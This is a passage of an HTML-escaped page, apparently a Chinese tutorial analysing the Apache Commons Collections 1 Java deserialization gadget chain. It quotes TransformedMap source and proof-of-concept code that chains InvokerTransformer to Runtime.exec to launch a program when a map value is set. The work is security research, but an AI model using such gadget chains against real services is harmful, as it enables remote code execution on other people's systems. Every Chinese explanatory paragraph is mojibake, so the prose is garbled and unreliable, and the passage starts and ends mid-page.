&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//-----------------------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * Hook method called when a value is being set using &amp;lt;code&amp;gt;setValue&amp;lt;/code&amp;gt;.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * &amp;lt;p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * An implementation may validate the value and throw an exception
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * or it may transform the value into another object.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * &amp;lt;p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * This implementation returns the input value.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @param value  the value to check
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @throws UnsupportedOperationException if the map may not be changed by setValue
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @throws IllegalArgumentException if the specified value is invalid
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @throws ClassCastException if the class of the specified value is invalid
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @throws NullPointerException if the specified value is null and nulls are invalid
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;checkSetValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isSetValueChecking&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨ctrl+Hé”®æŸ¥æ‰¾ç»§æ‰¿&lt;code&gt;AbstractInputCheckedMapDecorator&lt;/code&gt;æŠ½è±¡ç±»çš„&lt;code&gt;checkSetValue&lt;/code&gt;æ–¹æ³•ï¼Œæœ‰ä»€ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åˆ°çš„ï¼Œä¸»è¦æ˜¯èƒ½è§¦å‘æˆ‘ä»¬çš„transformçš„æ–¹æ³•çš„ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªç±»ç»§æ‰¿äº†å®ƒï¼Œå…¶ä¸­åœ¨&lt;code&gt;TransformedMap&lt;/code&gt;ç±»ä¸­çš„checkSetValueæœ‰è§¦å‘transformçš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä»readObjectèµ°åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠInvokerTransformerç±»èµ‹å€¼ç»™valueTransformerå°±è¡Œäº†ã€‚æˆ‘ä»¬çœ‹ä¸‹TransformedMapç±»ï¼Œä¹Ÿç»§æ‰¿äº†Serializableç±»ï¼Œä½†æ˜¯æ„é€ å‡½æ•°äº‹protectedå±æ€§çš„ï¼Œä¸èƒ½ç›´æ¥newã€‚ä¸è¿‡è¿˜æ˜¯æä¾›äº†decorateæ–¹æ³•ç»™æˆ‘ä»¬åˆ›å»ºå¯¹è±¡ï¼Œè€Œä¸”valueTransformerä¹Ÿå¯æ§ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;TransformedMap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Serializable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;7023152376788900464L&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keyTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valueTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keyTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valueTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keyTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valueTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keyTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valueTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;keyTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keyTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;valueTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valueTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰€ä»¥ä»£ç å¯ä»¥è¿™æ ·å†™ï¼Œforå¾ªç¯æ˜¯ç›´æ¥ç”¨æˆ‘ä»¬å…¥å£ç‚¹çš„AnnotationInvocationHandlerçš„readObjectæ¥å†™çš„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.Runtime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;invokerTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1111&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;invokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿˜æ˜¯å›åˆ°ä¸Šé¢inputçš„é—®é¢˜ä¸­ï¼Œå¦‚æœåˆ©ç”¨äº†AnnotationInvocationHandlerç±»è¿›è¡Œååºåˆ—åŒ–æŒ‰é“ç†æ˜¯ä¸ç”¨å†å¤„ç†inputäº‹æƒ…äº†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªåœ°æ–¹å­˜æ”¾æˆ‘ä»¬çš„inputåœ¨å†…éƒ¨ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹InvokerTransformeræ˜¯ç»§æ‰¿Transformerç±»çš„ï¼Œæˆ‘ä»¬çœ‹ä¸‹å…¶ä»–å¯¹è±¡æœ‰æ²¡æœ‰åˆé€‚å’Œä¹Ÿæœ‰transformæ–¹æ³•çš„ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå«&lt;code&gt;ChainedTransformer&lt;/code&gt;çš„ç±»å’Œ&lt;code&gt;ConstantTransformer&lt;/code&gt;ç±»ï¼Œé‡Œé¢å°±é‡å†™äº†transformæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦ç”¨åˆ°è¿™ä¸¤ä¸ªç±»å‘¢ï¼Ÿ&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;éƒ½æ˜¯ç»§æ‰¿äº†Transformer&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;éƒ½æœ‰é‡å†™transformæ–¹æ³•&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿™Transformerç±»çš„åŠŸèƒ½å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¦å¤–ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬è¿™é‡Œä¼šç”¨åˆ°çš„æœ‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;invokeTransformerï¼ˆé€šè¿‡åå°„ï¼Œè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼‰&lt;/li&gt;
&lt;li&gt;ChainedTransformerï¼ˆæŠŠå¤šä¸ªtransformerè¿æ¥æˆä¸€æ¡é“¾ï¼Œå¯¹ä¸€ä¸ªå¯¹è±¡ä¾æ¬¡é€šè¿‡é“¾æ¡å†…çš„æ¯ä¸€ä¸ªtransformerè¿›è¡Œè½¬æ¢ï¼‰&lt;/li&gt;
&lt;li&gt;ConstantTransformerï¼ˆæŠŠä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºå¸¸é‡ï¼Œå¹¶è¿”å›ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;çœ‹å®Œäº†è¿˜æ˜¯æ‡µçš„ï¼Œåˆ°åº•å¯¹æˆ‘ä»¬çš„ååºåˆ—åŒ–æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿä¸æ€¥ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹å®ƒä»¬æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Œåœ¨ConstantTransformerç±»ä¸­ï¼Œnewä¸€ä¸ªå¯¹è±¡ä¼šèµ‹å€¼ç»™iConstantå˜é‡ï¼Œæ‰§è¡Œtransformæ–¹æ³•ä¼šç›´æ¥è¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œè¿™æ ·å°±å®Œæˆäº†æŠŠä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºå¸¸é‡çš„è¿‡ç¨‹ï¼š&lt;/p&gt;
